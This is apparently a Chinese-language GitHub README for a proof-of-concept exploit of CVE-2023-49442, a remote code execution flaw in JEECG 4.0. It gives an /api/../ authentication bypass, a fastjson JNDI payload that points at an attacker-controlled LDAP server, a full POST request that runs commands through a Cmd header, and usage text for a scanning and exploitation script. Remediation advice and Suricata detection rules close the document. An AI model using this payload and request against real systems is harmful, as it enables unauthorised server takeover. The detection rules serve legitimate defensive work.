### 产品简介  
Jeecg( Code  Generation) 是开源的代码生成平台，目前官方已停止维护。  

### 漏洞概述  
Jeecg4.0及之前版本中，由于/api 接口鉴权时未过滤路径遍历，攻击者可构造包含../ 的url绕过鉴权。并且内部有使用fastjson1.2.31漏洞版本，攻击者可构造恶意请求利用jeecgFormDemoController.do?interfaceTest 接口进行jndi注入攻击实现远程代码执行，获取服务器权限。  

### 指纹识别  
fofa: app="JEECG"  

### 漏洞利用  
首先在VPS上利用JNDIExploit-1.4-SNAPSHOT.jar进行监听（https://github.com/WhiteHSBG/JNDIExploit）  
将以下内容保存到jeecg.txt，并使用Python开启WEB服务  
```
{
    "a":{
        "@type":"java.lang.Class",
        "val":"com.sun.rowset.JdbcRowSetImpl"
    },
    "b":{
        "@type":"com.sun.rowset.JdbcRowSetImpl",
        "dataSourceName":"ldap://xxxxxx:1389/Basic/TomcatEcho",
        "autoCommit":true
    }m
}
```
python3 -m http.server 8080  
之后对目标使用如下poc进行测试，当响应体中存在命令执行结果即利用成功。  
```
poc:
POST /api/../jeecgFormDemoController.do?interfaceTest= HTTP/1.1
Host: xxxxxxx
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:121.0) Gecko/20100101 Firefox/121.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 76
Cmd: whoami

serverUrl=http://xxxxxxx:8080/jeecg.txt&requestBody=1&requestMethod=GET
```
![Image text](https://github.com/YUUKI4O4/POC/blob/main/CVE-2023-49442/1.png)
![Image text](https://github.com/YUUKI4O4/POC/blob/main/CVE-2023-49442/2.png)

### 测试和利用脚本  
```
python3 CVE-2023-49442.py -h
usage: CVE-2023-49442.py [-h] [-t] [-c FILE] [-r FILE URL] [-u URL URL]

### JEECG jeecgFormDemoController Interface Code Execution Vulnerability(CVE-2023-49442) ###

options:
  -h, --help            show this help message and exit
  -t, --target_collection
                        Perform target collection
  -c FILE, --check FILE
                        Perform check testing. e.g:python CVE-2023-49442.py -c ./url.txt
  -r FILE URL, --exp FILE URL
                        Vulnerability exploitation. e.g:python CVE-2023-49442.py -r ./maybe_url.txt
                        http://VPS/jeecg.txt
  -u URL URL, --url URL URL
                        Vulnerability exploitation. e.g:python CVE-2023-49442.py -r http://target
                        http://VPS/jeecg.txt
```

### 修复建议  
1、请联系厂商进行修复。  
2、如非必要，禁止公网访问该系统。  
3、设置白名单访问。  
4、官方已停止维护，建议使用 org.jeecgframework.boot:jeecg-boot-parent 组件替换.  

### Suricata rules  
```
alert http any any -> any any (msg:"JEECG jeecgFormDemoController Interface Code Execution Vulnerability(CVE-2023-49442) #1 Vulnerability detection"; flow:established,to_server; flowbits:set,jeecgFormDemoController; content:"get";http_method;nocase; content:"/api/../jeecgFormDemoController.do?interfaceTest=";http_uri;fast_pattern;nocase; reference:url,https://github.com/YUUKI4O4/POC/tree/main/CVE-2023-49442; reference:cve,CVE-2023-49442; classtype:CVE; metadata:created_at 2024-01-26,updated_at 2024-01-26,creater:YUUKI4O4; sid:21; rev:1;)
alert http any any -> any any (msg:"JEECG jeecgFormDemoController Interface Code Execution Vulnerability(CVE-2023-49442) #2 Vulnerability exploitation"; flow:established,to_server; flowbits:set,jeecgFormDemoController; content:"post";http_method;nocase; content:"/api/../jeecgFormDemoController.do?interfaceTest=";http_uri;fast_pattern;nocase; content:"serverUrl=";nocase;http_client_body; content:"requestBody=";nocase;http_client_body; content:"requestMethod=GET";nocase;http_client_body; pcre:"/serverUrl=http[^&]+?&/Pi"; reference:url,https://github.com/YUUKI4O4/POC/tree/main/CVE-2023-49442; reference:cve,CVE-2023-49442; classtype:CVE; metadata:created_at 2024-01-26,updated_at 2024-01-26,creater:YUUKI4O4; sid:22; rev:1;)
alert http any any -> any any (msg:"JEECG jeecgFormDemoController Interface Code Execution Vulnerability(CVE-2023-49442) #3 Possible success"; flow:established,from_server; flowbits:isset,jeecgFormDemoController; content:"200";http_stat_code; content:"jsonStr";http_server_body;nocase; content:"msg";http_server_body;nocase; content:"{";http_server_body;nocase; content:"obj";http_server_body;nocase; content:"attributes";http_server_body;nocase; reference:url,https://github.com/YUUKI4O4/POC/tree/main/CVE-2023-49442; reference:cve,CVE-2023-49442; classtype:CVE; metadata:created_at 2024-01-26,updated_at 2024-01-26,creater:YUUKI4O4; sid:23; rev:1;)
```
